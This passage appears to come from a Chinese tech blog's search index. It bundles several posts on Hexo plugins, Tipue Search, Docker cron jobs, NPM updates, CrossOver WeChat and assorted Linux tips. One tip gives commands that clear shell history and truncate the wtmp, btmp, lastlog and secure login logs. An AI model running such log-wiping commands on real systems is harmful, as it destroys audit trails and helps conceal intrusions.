non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN apt-get -y update &amp;&amp; apt-get -y upgradeRUN apt-get -y install python-rsa python-requests cron rsyslog vim htop net-tools telnet apt-utils tree wget curl git make gccRUN apt-get -y autoclean &amp;&amp; apt-get -y autoremoveRUN sed -i "s/#cron./cron./g" /etc/rsyslog.confRUN echo "0 3 * * * root /usr/bin/python3 /usr/local/python_scripts/baidu_xiongzhang_day.py" &gt;&gt; /etc/crontabCMD service rsyslog start &amp;&amp; service cron start &amp;&amp; tail -f -n 20 /var/log/cron.log 若通过 Docker-Compose 来管理 Docker 镜像，那么 YML 配置文件的内容如下： 123456789101112version: \'3.5\'services: baidu-push: image: clay/baidu-push:1.0 container_name: hexo-baidu-push restart: always environment: TZ: \'Asia/Shanghai\' volumes: - /usr/local/baidu-push/logs:/tmp/baidu - /usr/local/baidu-push/baidu_xiongzhang_day.py:/usr/local/python_scripts/baidu_xiongzhang_day.py 数据卷挂载： /usr/local/baidu-push/logs：宿主机里的日志目录 /usr/local/baidu-push/baidu_xiongzhang_day.py：宿主机里 Python 脚本文件的路径 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"python"},{title:"Hexo 添加站内静态搜索（全站搜索）功能",url:"/posts/47b23c66.html",text:'前言网上各种 Hexo 站内静态搜索（全文搜索）方案，原理基本都是通过 Hexo 插件动态生成 JSON 数据文件，然后基于 JSON 数据文件，使用 JS 开发简单的搜索引擎，以此达到搜索目的。目前主流的方案是使用 NexT 主题集成的 hexo-generator-searchdb 插件，可惜该方案的 UI 代码和 JS 代码都严重耦合了 NexT 主题，对其他 Hexo 主题并不友好。由于笔者的博客使用的是 Yilia 主题，因此只能尝试其他替代方案，最终发现 Tipue Search 配合 hexo-tipue-search-db 实现的搜索效果挺不错。Tipue Search 是一款 JQuery 搜索插件，提供了基础的 UI 界面 和 JS 搜索引擎，只要浏览器支持 JQuery 就可以开箱即用，而且 UI 样式支持高度定制，非常适合对搜索界面有强自定义需求的使用场景。这里值得注意的是，上面介绍的站内静态搜索方案都存在共同的致命弱点，那就是当文章数量比较多的时候，Hexo 插件动态生成的数据文件的体积会很大（单位：MB），导致用户首次加载搜索界面时非常慢；而且由于浏览器缓存的缘故，不一定能够实时搜索到最新的文章内容。此时若想从根本上解决上述痛点，只能引入后端的搜索引擎技术，例如 Elasticsearch、Solr、Lucene 等，可这又违背了 Hexo 打造静态博客的初衷。附上本站 Tipue Search 的演示案例。 Hexo 安装插件插件安装 hexo-tipue-search-db 插件主要用来生成搜索引擎需要的 JS 数据文件（tipuesearch_content.js），默认存放的文件路径为： ${blog_root}/public/tipuesearch/tipuesearch_content.js，该插件兼容 Tipue Search 7.1 +。 12345# 进入博客的根目录$ cd ${blog_root}# 安装Hexo插件$ npm install hexo-tipue-search-db --save 插件配置123tipue_search_db: exclude_page: false # Default posts and pages are included in generated db file, you can exclude pages by value true path: \'/tipuesearch/tipuesearch_content.js\' # Custom db file path, base on directory \'${blog_root}/public\' Tipue Search 配置值得一提的是，下面介绍的配置内容原则上适用于任何 Hexo 主题，只是个别配置细节不同而已，笔者已验证过可以适用于 Yilia 与 NexT 8.x 主题。 Tipue Search 下载本教程使用 Tipue Search 7.1，从本站下载 Tipue Search 7.1 的压缩包并解压。以 Yilia 主题为例子，将解压后得到的 tipuesearch 文件夹复制到 Yilia 主题的 ${theme_dir}/source 目录下。若使用的 Hexo 主题是 NexT 8.x，则将解压后得到的 tipuesearch 文件夹复制到 NexT 主题的 ${theme_dir}/source/lib 目录下。 添加 HTML 代码到 HEAD 标签内将以下代码添加到 Hexo 主题的模板文件中的 HEAD 标签内，以 Yilia 主题为例子，模板文件的路径可参考：${theme_dir}/layout/_partial/head.ejs 1234567&lt;link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css"&gt;&lt;script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="tipuesearch/tipuesearch_content.js"&gt;&lt;/script&gt;&lt;link rel="stylesheet" href="tipuesearch/tipuesearch.css"&gt;&lt;script src="tipuesearch/tipuesearch_set.js"&gt;&lt;/script&gt;&lt;script src="tipuesearch/tipuesearch.min.js"&gt;&lt;/script&gt; 添加搜索框到指定的 Web 页面在需要使用搜索框的任意 UI 模板（Web 页面）中添加以下代码，样式可以根据自己的需求高度自定义 12345678910111213&lt;form&gt; &lt;div class="tipue_search_group"&gt; &lt;input type="text" name="q" id="tipue_search_input" pattern=".{3,}" title="At least 3 characters" autofocus="autofocus" required&gt;&lt;button type="submit" class="tipue_search_button"&gt;&lt;div class="tipue_search_icon"&gt;&amp;#9906;&lt;/div&gt;&lt;/button&gt; &lt;/div&gt;&lt;/form&gt;&lt;div id="tipue_search_content"&gt;&lt;/div&gt;&lt;script&gt; $(document).ready(function() { $(\'#tipue_search_input\').tipuesearch(); });&lt;/script&gt; 或者添加到 Hexo 新建的搜索页面中 12# 通过Hexo的命令新增搜索页面$ hexo new page search 添加 HTML5 的自动补全功能若希望 Tipue Search 的搜索框使用 HTML5 的自动补全功能，只需在 input 标签内添加 list 属性和在页面中添加 datalist 标签即可。特别注意：list 属性的值必须与 datalist 标签的 ID 值一致。 12345678910111213&lt;form&gt; &lt;div class="tipue_search_group"&gt; &lt;input type="text" name="q" id="tipue_search_input" pattern=".{3,}" title="At least 3 characters" list="search" autocomplete="off" autofocus="autofocus" required&gt;&lt;button type="submit" class="tipue_search_button"&gt;&lt;div class="tipue_search_icon"&gt;&amp;#9906;&lt;/div&gt;&lt;/button&gt; &lt;/div&gt;&lt;/form&gt;&lt;datalist id="search"&gt; &lt;option&gt;jQuery&lt;/option&gt; &lt;option&gt;Support&lt;/option&gt; &lt;option&gt;Tipr&lt;/option&gt; &lt;option&gt;Tipue&lt;/option&gt; &lt;option&gt;Tipue Search&lt;/option&gt;&lt;/datalist&gt; Tipue Search 常用参数Tipue Search 默认只支持搜索整个英文单词，若想支持中文搜索，必须设置参数： \'wholeWords\': false，其他常用参数的说明如下： 123456789$(\'#tipue_search_input\').tipuesearch({ \'show\': 10, // 每页显示的最大搜索记录数，默认值：10 \'showURL\': false, // 是否将URL显示在每个搜索结果中，默认值：true \'newWindow\': true, // 点击搜索结果时是否在新的浏览器选项卡中打开页面，默认值：false \'footerPages\': 10, // 页脚中显示的最大页面选择数，默认值：3 \'minimumLength\': 3, // 搜索关键字中最小的字符长度，默认值：3 \'wholeWords\': false, // 是否不使用英语以外的其他语言，默认值：true \'showTitleCount\': false // 是否将搜索结果的数量显示在浏览器选项卡的标题中，默认值：true }); Tipue Search 的特性 Tipue Search 7.1 依赖 JQuery-2.2.4，官方推荐使用 JQuery-3.x，实测使用低版本的 JQuery-1.11.0 也可以正常运行 Tipue Search 不同版本之间最本质的区别是：新版的数据文件是 JS 文件，旧版的数据文件是 JSON 文件，两者互不兼容 Tipue Search 7.1 默认的数据文件名为：tipuesearch_content.js，Tipue Search 旧版本的数据文件名则为：tipuesearch_content.json Tipue Search 支持包括：Chrome 49+，Edge 16+， IE10+， Firefox 58+， Safari 11+， iOS Safari 10.3+， Chrome for Android 66+， Samsung Internet 4+ 等现代浏览器 最终搜索效果图 Tipue Search Preview 参考资料 Tipue Search 官网 Hexo-Tipue-Search-Json 插件 Hexo-Generator-SearchDB 插件 分享几个实用的 Hexo 博客功能插件 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"静态博客"},{title:"Hexo 插件开发",url:"/posts/f30bc89b.html",text:'Hexo 官方教程 普通插件开发 标签插件开发 已开发插件的列表 hexo-pdf-better，Hexo PDF 插件 hexo-site-auth，Hexo 站点验证插件 hexo-google-adsense，Hexo 谷歌广告插件 hexo-admonition-better，Hexo 内容辅助插件 hexo-tipue-search-db，Hexo 全文静态搜索插件 hexo-lazyload-image-better，Hexo 图片懒加载插件 hexo-waline-next，适用于 NexT 主题的 Waline 评论插件 hexo-next-darkmode，适用于 NexT 主题的暗黑模式切换插件 hexo-generator-sogou-sitemap，Hexo 生成搜狗站点地图的插件 hexo-readmore，Hexo 阅读更多插件，将将博客流量导流到微信公众号 发布插件到 Hexo 官网当完成插件的开发后，可以考虑将它发布到 Hexo 的插件列表，让更多人能够使用自己开发的插件，其中发布插件的步骤（如下所示）和 Hexo 更新文档非常类似。 Fork hexojs/site 仓库 将已 Fork 的仓库 Clone 到本地磁盘，并安装所依赖的插件 123$ git clone https://github.com/&lt;username&gt;/site.git$ cd site$ npm install 编辑 source/_data/plugins.yml 文件，新增自己的插件，例如： 1234567- name: hexo-next-darkmode description: Add Darkmode for NexT theme link: https://github.com/rqh656418510/hexo-next-darkmode tags: - next - darkmode - nightmode 可以通过 Hexo 启动服务器预览变动 1$ hexo server 推送（Push）代码 12$ cd site$ git push orign master 在 Github 建立一个新的合并申请（Pull Request）并描述改动 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"静态博客 前端"},{title:"日常编程开发技巧之二",url:"/posts/eb118fe2.html",text:'Centos 7 卸载系统自带的 NodeJs 123456789101112131415# 查看已安装的npm# rpm -qa|grep npm# 查看已安装的nodejs# rpm -qa|grep nodejs# 卸载# yum -y remove nodejs npm# 删除残留文件# rm -rf ~/.npm# rm -rf ~/.npmrc# rm -f /usr/bin/npm# rm -f /usr/bin/node# rm -rf /usr/lib/node_modules Linux 批量替换文件内容 12345678910111213# 命令格式：sed -i "s/查找字段/替换字段/g" `grep 查找字段 -rl 路径`# 为了不区分大小写匹配搜索，可以使用 I 参数$ sed \'s/unix/linux/gI\' sed-test.txt# 将当前目录下所有文件中的字符串oldstring替换为newstring$ sed -i "s/oldstring/newstring/g" `ls`# 查找当前目录下所有后缀为md的文件，并将文件中的字符串oldstring替换为newstring$ sed -i "s/oldstring/newstring/g" `find . -name "*.md"`# 当搜索和替换含分隔符的字符串时，需要用反斜杠 \\ 来取消转义$ sed "s/\\/bin\\/bash/\\/usr\\/bin\\/fish/g" sed-test.txt Linux 删除文件中的某行内容 12345# 删除文件中的某行内容$ sed -i \'/hello/d\' abc.txt# 查找当前目录下所有后缀为txt的文件，并批量删除文件中的某行内容$ find . -type f -iname "*.txt" | xargs -I {} sed -i \'/hello/d\' {} Linux 批量替换文件名中的字符串 12345678910111213141516# 假设原文件名是“stu_102999_5_finished.jpg”，需要替换字符串"_finished"为""空字符串# 方法一：使用rename改名(支持中文特殊字符的替换)$ rename "_finished" "" *.jpg# 使用rename批量改名$ find . -name "*.avi" | xargs -I {} rename "xxx" "" {}# 方法二：for循环结合sed替换$ for file in `ls *.jpg`;do mv $file `echo $file|sed \'s/_finished//g\'`;done;# 方法三：for循环加变量部分截取$ for file in `ls *.jpg`;do mv $file `echo ${file%_finished*}.jpg`;done;# 方法四：ls结合awk，输出交给bash执行$ ls *.jpg |awk -F "_finished" \'{print "mv "$0" "$1$2""}\'|bash Linux 搜索文件里面的内容 1234567891011121314# 在单个文件中搜索内容，区分大小写$ grep \'keyword\' filename# 在单个文件中搜索内容，忽略区分大小写$ grep -i \'keyword\' filename# 在多个文件中搜索内容，忽略区分大小写$ grep -i \'keyword\' filename1 filename2 filename3# 搜索一个目录下所有文件里面的内容，忽略区分大小写$ find . -type f -name "*" | xargs grep -i "keyword"# 搜索一个目录下后缀为 .properties 的文件里面的内容，忽略区分大小写$ find . -type f -name "*.properties" | xargs grep -i "keyword" FFmpeg 常用命令 12345# 将flv格式的视频转换为mp4格式$ ffmpeg -i xxxxx.flv xxxxx.mp4# 按时间戳截取视频片段$ ffmpeg -i ./SN.mp4 -vcodec copy -acodec copy -ss 00:00:00 -to 00:00:05 ./cutout1.mp4 -y Hexo 创建草稿 12345678910111213# 创建草稿，默认会在source/_drafts目录下生成first-draft.md文件$ hexo new draft "first-draft"# 提示：草稿不会被显示在任何页面上，链接也访问不到，也就是说如果想把某一篇文章移除显示，又不舍得删除，可以尝试把它移动到source/_drafts目录之中# 如果希望强行预览草稿，可以更改_config.yml配置文件中的以下参数render_drafts: true# 或者，使用如下方式启动server后预览草稿$ hexo server --drafts# 将草稿转成正式文章$ hexo publish "first-draft" Linux 压缩 Jpeg 图片 1234567891011# 安装软件# yum install -y jpegoptim# 指定图片压缩后的大小$ jpegoptim --size=520k pic.jpeg# 指定图片压缩质量$ jpegoptim -m80 pic.jpg --dest pic-2.jpg# 批量压缩图片$ find . -name "*.jpg" | xargs jpegoptim Linux 压缩 Png 图片 12345# 安装软件# yum install -y optipng# 压缩图片$ optipng pic.png -out pic-2.png https://github.com/bugwhine/lookbusy 卸载 UrBackup 服务 12345678910111213141516171819202122232425# 提示：UrBackup的服务之前是通过手动编译的方式来安装# 查找UrBackup的自启动服务# systemctl list-unit-files --type=service | grep enabled | grep urbackup# 停止UrBackup的自启动服务# systemctl stop urbackup-server.service# systemctl disable urbackup-server.service# 删除UrBackup的日志文件# rm -rf /var/log/urbackup.log# 删除UrBackup的安装文件# rm -rf /usr/local/var/urbackup# rm -rf /usr/local/share/urbackup# rm -rf /usr/local/bin/urbackupsrv# 删除UrBackup的配置文件# rm -rf /etc/default/urbackupsrv# rm -rf /etc/logrotate.d/urbackupsrv# rm -rf /etc/systemd/system/urbackup-server.service# 查漏补缺，将搜索到的文件全部删除掉# find / -type d -iname \'urbackup\'# find / -type f -iname \'urbackupsrv\' Github 搜索技巧 Github 官方的搜索语法介绍，常用搜索示例如下，当同时使用多个搜索参数时，使用” 空格” 符隔开不同的参数 in:name spring // 搜索名字中带有”spring” 的项目 in:readme spring // 搜索 readme 中带有”spring” 的项目 in:description spring // 搜索描述中带有”spring” 的项目 stars:&gt;1000 // 搜索 stars&gt;1000 的项目 forks:&gt;1000 // 搜索 forks&gt;1000 的项目 pushed:&gt;2020-01-15 // 搜索最近更新于 2020 年 1 月 15 日之后的项目 language:Python // 搜索 Python 的项目 Linux 查看硬盘转数 1234567891011121314151617# 下载sg3_utils工具的压缩包，官网地址：http://sg.danny.cz/sg/sg3_utils.html# wget http://sg.danny.cz/sg/p/sg3_utils-1.45.tar.xz# 解压文件# tar -xvf sg3_utils-1.45.tar.xz# 进入解压目录# cd sg3_utils-1.45# 编译安装# ./configure# make &amp;&amp; make install# 查看硬盘转数$ sg_vpd --page=0xb1 /dev/sdeNominal rotation rate: 7200 rpmNominal form factor: 3.5 inch Linux 使用 Sysbench 进行压测 常用的压测工具：ab、stress、sysbench、webbench、jmeter。 1234567891011121314151617181920212223# 压测CPU性能（单核、四核、八核）$ sysbench --test=cpu --num-threads=1 --max-requests=10000 run$ sysbench --test=cpu --num-threads=4 --max-requests=100000 run$ sysbench --test=cpu --num-threads=8 --max-requests=100000 run# 压测CPU性能（单核、四核、八核），cpu-max-prime 是素数生成数量的上限，threads 是线程数，time 是运行的时间（秒），event 是达到上限的次数（默认值为0，表示不限制上限次数）$ sysbench cpu --cpu-max-prime=20000 --threads=1 --time=10 run$ sysbench cpu --cpu-max-prime=20000 --threads=4 --time=10 run$ sysbench cpu --cpu-max-prime=20000 --threads=8 --time=10 run# 压测内存性能（随机读写、连续读写）$ sysbench --test=memory --memory-block-size=1K --memory-total-size=1G --memory-access-mode=rnd run$ sysbench --test=memory --memory-block-size=1K --memory-total-size=1G --memory-access-mode=seq run# 压测八线程的共享线程锁$ sysbench --test=threads --num-threads=1000 --thread-yields=1000 --thread-locks=8 run# 压测互斥锁$ sysbench --test=mutex --mutex-num=4096 --mutex-locks=50000 --mutex-loops=10000 run# 压测磁盘IO（随机读写、连续读写）$ sysbench --test=fileio --file-num=2 --file-total-size=64M --file-test-mode=rndwr run$ sysbench --test=fileio --file-num=2 --file-total-size=64M --file-test-mode=seqrewr run CRT 格式证书转为 PEM 格式证书 1$ openssl x509 -in example.com.crt -out example.com.pem -outform PEM 系统端口号冲突排查 123456# 查看当前系统各服务占用的端口号# netstat -lntup# 查看占用8080端口的服务# netstat -anp|grep 8080# netstat -aon|grep 8080 Centos 6、7 的服务类相关命令 Centos 6 注册在系统中的标准化程序 统一的管理方式（常用方法） service 服务名 start service 服务名 stop service 服务名 restart service 服务名 status 查看服务的方法： /etc/init.d/服务名 通过 chkconfig 命令管理服务自启动 查看自启动的服务： chkconfig --list|grep xxx 启用服务自启动： chkconfig --level 5 服务名 on 关闭服务自启动： chkconfig --level 5 服务名 off Centos 7 注册在系统中的标准化程序 统一的管理方式（常用方法） systemctl start 服务名（xxx.service） systemctl stop 服务名（xxx.service） systemctl restart 服务名（xxx.service） systemctl reload 服务名（xxx.service） systemctl status 服务名（xxx.service） 查看服务的方法： /usr/lib/systemd/system/服务名 查看服务的命令 systemctl list-unit-files | grep service_name systemctl --type service | grep service_name 通过 systemctl 命令管理服务自启动 启用服务自启动： systemctl enable service_name 关闭服务自启动： systemctl disable service_name Centos7 管理不同版本的 JDK /etc/alternatives/ 目录存放着系统默认命令的链接符，而 update-alternatives 是 Linux 系统中专门维护系统命令链接符的工具，通过它可以很方便地设置系统默认使用哪个命令、哪个软件版本。例如，在系统中同时安装了 Open JDK 和 Oracle JDK（两者都通过 RPM 包安装），而实际又希望系统默认使用的是 Oracle JDK，此时就可以通过 update-alternatives 很方便地实现。当执行以下命令后，根据输出的提示信息，直接输入希望被系统默认使用的选项的编号即可；命令执行完后，可以看到 /etc/alternatives/ 目录下 Java 相关的链接符发生了改变。 1234567891011# update-alternatives --config java共有 3 个提供“java”的程序。 选项 命令----------------------------------------------- 1 /usr/java/jdk1.8.0_102/jre/bin/java 2 java-1.8.0-openjdk.x86_64 (/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.272.b10-1.el7_9.x86_64/jre/bin/java)*+ 3 /usr/java/jdk-11.0.9/bin/java按 Enter 保留当前选项[+]，或者键入选项编号： 特别注意的是，如果 JDK 是通过解压的方式来安装的（非 RPM 包安装），那么就只能通过手动配置系统的 JDK 环境变量来替代 update-alternatives 命令的功能，具体可以参考以下配置： 12345678910# 编辑配置文件，添加对应的JDK环境变量# vim /etc/profileJAVA_HOME=/usr/java/jdk1.8.0_102JRE_HOME=/usr/java/jdk1.8.0_102/jrePATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/binCLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/libexport JAVA_HOME JRE_HOME PATH CLASSPATH# 使配置文件生效# source /etc/profile Markdown 折叠代码语法 code：指定代码块 details：折叠语法标签 summary：折叠语法展示的摘要 pre：以原有格式显示元素内的文字是已经格式化的文本 Centos7 清除命令历史记录、登录信息 123456# 清除命令历史记录$ echo &gt; .bash_history$ history -cw# 验证清除效果$ history 12345678# 清除登录信息$ sudo sh -c \'echo &gt; /var/log/wtmp\'$ sudo sh -c \'echo &gt; /var/log/btmp\'$ sudo sh -c \'echo &gt; /var/log/lastlog\'$ sudo sh -c \'echo &gt; /var/log/secure\'# 验证清除效果$ last 配置阿里巴巴的 DNS 服务 域名系统（服务）协议（DNS）是一种分布式网络目录服务，主要用于域名与 IP 地址的相互转换，以及控制因特网的电子邮件的发送。在 Linux 服务器上快速配置阿里巴巴 DNS 服务的方法如下： 12345678# 编辑系统配置文件，只需要添加以下两行内容# vim /etc/resolv.confnameserver 223.5.5.5nameserver 223.6.6.6# 重启网络服务# service network restart 模拟 CPU 高负载 Lookbusy 的安装，详见 Lookbusy 官网 1234567891011121314151617# 下载# wget http://www.devin.com/lookbusy/download/lookbusy-1.4.tar.gz# 解压# tar -xvf lookbusy-1.4.tar.gz# 进入解压目录# cd lookbusy-1.4 # 预配置# ./configure# 编译# make -j4# 安装# make install Lookbusy 的使用 1234567891011121314# 让所有CPU核心的使用率都是30%$ lookbusy -c 30# 让两个CPU核心的使用率为30%$ lookbusy -n 2 -c 30# 让所有CPU核心的使用率在60%-70%上下浮动$ lookbusy -c 60-70 -r curve# 让所有CPU核心的使用率在20%-80%之间，周期为24小时，在14点达到峰值$ lookbusy --cpu-mode curve --cpu-curve-peak 14h -c 20-80# 让所有CPU核心的使用率在20%-30%之间，周期为60分钟，在30分钟达到峰值$ lookbusy --cpu-mode curve --cpu-curve-period 60m --cpu-curve-peak 30m -c 20-30 Debian/Ubuntu 安装 GCC 与 G++ build-essential 是 C/C++ 的开发包，包含了 gcc、g++、make、gdb 和 libc 等工具，执行下面的命令安装即可： 1# apt-get -y install build-essential Centos7 更改内核启动顺序 1234567891011121314# 查看当前系统有几个内核# cat /boot/grub2/grub.cfg |grep menuentry # 查看当前系统的默认内核# grub2-editenv list # 更改系统默认的启动内核# grub2-set-default \'CentOS Linux (3.10.0-514.26.2.el7.x86_64) 7 (Core)\'# 重启系统生效# reboot# 重启后查看内核是否已经修改# uname -a var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux 开发随笔"},{title:"Hexo 更新 NPM 模块",url:"/posts/7ffec382.html",text:'系统环境 123NPM：6.4.1NodeJs： v10.15.0Linux： Debian 9（stretch） NPM 更新模块（第一种方法） 假设需要将模块 hexo-site-auth@0.0.3 更新至 hexo-site-auth@0.0.4，可参考以下操作步骤。由于国内下载 NPM 模块的网速很慢，建议使用代理进行下载。注意这里不能使用 CNPM + 淘宝镜像来安装 NPM 模块，具体原因下面会给出解释。 1234567# 进入Hexo的根目录$ cd hexo_blog# 更新NPM模块（与模块的安装操作没有本质区别，只是指定了新的版本号），如果执行失败可尝试删除package-lock.json文件后再更新$ npm install hexo-site-auth@0.0.4 --save# 提示：当安装命令不带具体版本号时，则表示默认安装最新版本的NPM模块 NPM 更新模块（第二种方法） 123456789101112# 进入Hexo的根目录$ cd hexo_blog# 编辑package.json配置文件，更改对应模块的版本号为目标版本号$ vim package.json"hexo-site-auth": "0.0.4"# 安装NPM模块$ npm install# 若安装失败，可以尝试删除NPM的整个模块目录后再安装$ rm -rf node_modules 检查更新模块是否成功 12345678910# 通过Hexo清理Public目录$ hexo clean# 通过Hexo构建静态文件$ hexo generate# 通过Hexo启动服务$ hexo server# 若Hexo的Web服务可以正常启动，则说明NPM模块更新成功 Gulp 压缩图片失败 若上面使用淘宝的 CNPM + 淘宝镜像来安装 NPM 模块，整个安装过程很顺利，但 Gulp 执行图片压缩的时候，可能会出现以下错误。初步判断是 CNPM 安装 gulp-imagemin 模块时出了问题，此时需要先卸载 gulp-imagemin，然后使用 NPM 工具重新安装 gulp-imagemin。 12345remote: (node:2037) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 282)remote: (node:2037) UnhandledPromiseRejectionWarning: Error: spawn /home/git/blog-githooks-build-repo/node_modules/_optipng-bin@5.1.0@optipng-bin/vendor/optipng EACCESremote: at Process.ChildProcess._handle.onexit (internal/child_process.js:232:19)remote: at onErrorNT (internal/child_process.js:407:16)remote: at process._tickCallback (internal/process/next_tick.js:63:19) 12345678910# 进入Hexo的根目录$ cd hexo_blog# 卸载gulp-imagemin$ npm uninstall gulp-imagemin@5.0.3 --save# 安装gulp-imagemin$ npm install gulp-imagemin@5.0.3 --save# 强烈建议直接删除整个node_modules目录，然后使用NPM工具重新安装所有模块 注意事项 package-lock.json 文件不是必要的，如果希望更新该文件，可直接删除文件，然后执行 “npm install” 操作后会自动重新生成该文件 执行 “npm install” 操作后，可以接着执行 “npm audit fix”，但绝对不能再执行 “npm audit fix –force”，否则会强制升级 NPM 模块的版本，导致后续因代码不兼容，出现各种编译错误 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"静态博客"},{title:"CrossOver 安装微信（WeChat）",url:"/posts/a1930361.html",text:'前言笔者曾在文章”CentOS 7 安装常用桌面软件 “中，推荐使用 electronic-wechat 作为 Linux 微信客户端，可惜在 CentOS 7 环境下的长期使用体验比较一般，例如接收到消息时无声音提示，且微信的托盘图标不会闪烁，同时由于 electronic-wechat 是在 Web 版微信的基础上开发的，这就导致新注册的微信账号登录受限，最终无法使用。经过一番尝试，发现 CrossOver 可以近乎完美地安装微信，而且运行的是微信官方原生的二进制执行文件。本教程适用于 Debian/Ubuntu/CentOS 系的 Linux 发行版，文章末尾附有微信运行的最终效果图。 软件版本说明 CrossOver： 19.0.0 微信 PC 客户端： 2.7.1.88 CrossOver 容器： WinXp-64-bit Linux 系统的输入法：搜狗输入法 For Linux 2.2.0.0108 CrossOver 安装运行微信遇到的坑CrossOver 安装微信的过程中可能遇到了以下问题，本文后面会详细一一给出对应的解决方法： 微信启动时偶尔崩溃 启动微信提示 WeChatWin.dll 文件缺失 微信的输入框无法显示光标与文字，只能复制黏贴 微信屏幕截图后，无法直接发送图片 微信的输入框无法使用搜狗输入法（Linux 版）输入中文 Linux 安装 CrossOverCrossOver 支持 Ubuntu、Mint、Debian 使用 deb 包安装，支持 Fedora、RHEL 使用 rpm 包安装，支持其他发行版（例如 CentOS）使用 bin 安装包安装。CrossOver 的安装比较简单，此处不再累述，可参考” 官方安装教程 “。推荐使用 root 用户进行安装，若安装过程中自定义了 CrossOver 的安装路径，则需要新增环境变量来指定 CrossOver 的安装路径，否则 CrossOver 部分命令将无法使用。 123456# 添加环境变量，指定CrossOver的自定义安装路径# vim /etc/profileexport CX_ROOT=/usr/local/cxoffice# 使配置生效# source /etc/profile CrossOver 安装微信从微信官网下载 PC 版的微信客户端后，可参考”CrossOver 如何安装未知应用程序 “里的步骤，在 CrossOver 上安装原生的微信 PC 客户端。 解决微信运行后出现的各种问题微信启动时偶尔崩溃微信需要运行在 CrossOver 的 WinXp-64-bit 容器中，否则微信启动时可能会崩溃。 微信屏幕截图后，无法直接发送图片微信屏幕截图，如果按” 钩” 确定截图完成，那么截图将则直接消失，不会将图片显示到输入框里，导致无法直接发送图片。建议截图完成后保存图片到本地，再从本地将图片拖拽到输入框里，这样就可以正常发送图片了。强烈推荐使用系统自带的截图工具或者第三方截图工具（例如 Shutter）替代微信的截图功能，因为可以将粘贴板里的图片直接粘贴到微信的输入框里。 启动微信提示 WeChatWin.dll 文件缺失原因是 Linux 系统缺少 lib32-libldap 依赖库，导致 CrossOver 无法加载特定的 dll 文件，安装上对应的依赖库后，重启微信客户端即可。 12345# 适用系统：Debian/Ubuntu/Mint# apt-get install -y libldap-2.4-2:i386# 适用系统：Fedora/RHEL/CentOS# yum install -y 